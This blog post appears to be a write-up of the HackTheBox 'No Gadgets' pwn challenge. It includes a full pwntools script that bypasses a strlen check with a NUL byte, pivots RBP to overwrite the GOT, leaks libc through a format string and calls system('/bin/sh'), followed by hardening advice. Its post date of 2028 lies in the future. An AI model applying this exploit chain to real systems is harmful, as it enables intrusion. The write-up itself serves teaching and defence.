---
layout: post
title: "No Gadgets"
date: 2028-05-29 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, ret2libc, got-overwrite, stack-pivot, format-string, glibc, cwe-121]
description: "A gadget-free, leak-free ret2libc. With a writable GOT and a leave;ret you control, you make the program's own fgets overwrite the GOT — then turn strlen into printf, then into system."
---

## Overview

No Gadgets is a **Medium** HackTheBox **Pwn** challenge. A trivial-looking
`fgets` overflow is guarded by a `strlen` length check, the binary has **no
useful ROP gadgets** (no `pop rdi`, and glibc 2.35 dropped `__libc_csu_init`),
and nothing leaks an address. The solve manufactures an arbitrary write out of
the function's own `leave; ret` epilogue, uses the GOT to build a format-string
leak, then overwrites `strlen@got` with `system`.

## The technique

```c
int main() {
    char buf[0x80];
    printf("Data: ");
    fgets(buf, 0x1337, stdin);
    if (strlen(buf) > sizeof(buf)) exit(EXIT_FAILURE);
    else puts("Pathetic, 'tis but a scratch!");
}
```

`checksec`: **No PIE**, **Partial RELRO** (GOT writable), **NX**, **no canary**.
`fgets(buf, 0x1337, ...)` into `buf[0x80]` is a huge
[stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html), but
`strlen(buf) > 0x80` gates it.

Two things make this a "no gadgets" puzzle: there is no `pop rdi` to set up a
`system("/bin/sh")` call, and there is no address-leak primitive.

**Guard bypass:** `strlen` stops at the first NUL byte, while `fgets` copies
every byte up to the newline. Lead the payload with `\x00` and the check
measures a tiny length while the overflow bytes ride behind the NUL.

**Make the program write its own GOT.** `leave` is `mov rsp, rbp ; pop rbp`.
Overwrite the *saved RBP* with `puts@got + 0x80` and return to the instruction
just before `call fgets`, where the buffer is `[rbp - 0x80]`. After the pivot,
`rbp = puts@got + 0x80`, so the buffer is `puts@got` — the next `fgets` writes
straight into the GOT.

## Solution

Three `fgets` rounds, no leak primitive needed. `solve.py`:

```python
from pwn import *

elf = ELF("no_gadgets", checksec=False)
libc = ELF("libc.so.6", checksec=False)

FGETS_GADGET = 0x40121b   # right before `call fgets`, buf = rbp-0x80
PRINTF_CALL  = 0x401216   # `call printf@plt` site
RET          = 0x401016   # plain ret (alignment)
LEAK_OFF     = 0x114992   # 3rd %p -> libc, low 12 bits 0x992

io = remote(HOST, PORT)

# stage 1: pivot rbp into the GOT so the next fgets writes it
io.sendlineafter(b"Data: ", flat([
    b"\x00", b"\x90"*127, elf.got["puts"]+0x80, RET, FGETS_GADGET]))

# stage 2: strlen@got -> `call printf@plt`; puts@got = "%p%p%p%p" (leak fmt);
#          others -> plt+6 so the lazy resolver keeps them alive
io.sendline(flat([b"%p%p%p%p", PRINTF_CALL,
    elf.plt["printf"]+6, elf.plt["fgets"]+6, elf.plt["setvbuf"]+6, elf.plt["exit"]+6]))

data  = io.recvrepeat(2)                       # leak prints BEFORE "scratch!"
leaks = [int(x, 16) for x in re.findall(rb"0x[0-9a-f]+", data)]
leak  = [x for x in leaks if x > 0x7f0000000000 and (x & 0xfff) == (LEAK_OFF & 0xfff)][0]
libc.address = leak - LEAK_OFF                 # base from the provided libc

# stage 3: strlen@got -> system, buf = "/bin/sh" -> system("/bin/sh")
io.sendline(flat([b"/bin/sh\x00", libc.sym["system"]]))
io.sendline(b"cat flag.txt")
io.interactive()
```

Stage 2 repoints `strlen@got` to the binary's own `call printf@plt` site, so the
next `strlen(buf)` runs `printf("%p%p%p%p")` — a
[format-string](https://cwe.mitre.org/data/definitions/134.html) leak. Pick the
libc pointer by its **low 12 bits** (ASLR is page-aligned, so those bits equal
the constant offset), and compute the base from the *provided* libc rather than a
hardcoded value. The leak is emitted *before* the program's normal line, so read
with `recvrepeat` + regex, not `recvuntil`. Running it against the live target
prints the flag `HTB{...}`.

## Why it worked

A writable GOT plus a reachable `leave; ret` whose saved RBP we control is enough
to turn the program's own input call into an arbitrary write — no gadgets, no
leak primitive. The GOT then lets us redirect one libc call into `printf` (leak)
and another into `system` (shell). The challenge name is the punchline: you don't
need `pop rdi`.

## Fix / defense

- Compile `-fPIE -pie` (randomises PLT/GOT, removing the No-PIE static pivot
  targets) and `-fstack-protector-strong` (a canary blocks the saved-RBP/RIP
  smash).
- Enable **Full RELRO** so the GOT is read-only and cannot be overwritten.
- Bound the read to the destination — `fgets(buf, sizeof(buf), stdin)`. A
  `strlen`-after-the-fact check runs too late and is trivially fooled by a NUL
  byte.
